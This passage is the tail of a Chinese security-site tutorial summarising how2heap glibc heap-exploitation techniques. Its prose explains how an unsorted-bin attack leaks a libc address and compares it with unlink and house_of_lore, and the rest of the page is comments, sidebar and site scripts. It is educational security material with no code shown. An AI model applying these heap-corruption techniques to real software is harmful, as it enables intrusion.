2em;">然后<strong>stack_var</strong>的值就被改写成了unsortedbin的head的地址了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这也算是unlink的另一种用法，上一篇的总结中，<strong>unsafe_unlink</strong>通过unlink来直接控制地址，这里则是通过unlink来泄漏libc的信息，来进行进一步的攻击。流程也较为简单。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">和<strong>house_of_lore</strong>操作有点像，也是通过修改victim的bk字段，不过我们做这个的主要目的不是返回一个可控的地址，而是将libc的信息写到了我们可控的区域。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x0A 写在最后</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">个人水平有限，加上总结的时候有一些不太重要的点被我选择性地忽略了，如果有疑问请在下面留言。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后一个例程<strong>house_of_einherjar</strong>在新版glibc已经不能用了，所以不做介绍。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/4383.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】how2heap总结-下 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="4383" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t01a4a92bb6151ed710.jpg'/>              
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="2556795459" class="response" data-bind-id="2556795459" data-target="16610" user-name="7o8v_" href="javascript:;">
                7o8v_            </a>
                        <span class="comment-time">2017-09-11 13:27:59</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2556795459" data-target="16610">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16610" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">上次在公众号发的是上，这是下。  = =</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
<div class="clearfix re-comment">
    <div class="comment-quote">  
        <div class="comment-user">
            <a href="javascript:;" class="response" data-bind-id="820455891" data-target="16605">beswing</a> <span class="comment-time">2017-09-11 11:54:11</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="820455891" data-target="16605">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16605" data-type="comment">点赞</a></span>            </div>
            <p>二次投稿了吧？。。</p>
        </div>
    </div>
        </div>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/4x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="820455891" class="response" data-bind-id="820455891" data-target="16605" user-name="beswing" href="javascript:;">
                beswing            </a>
                        <span class="comment-time">2017-09-11 11:54:11</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="820455891" data-target="16605">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16605" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">二次投稿了吧？。。</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4383" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
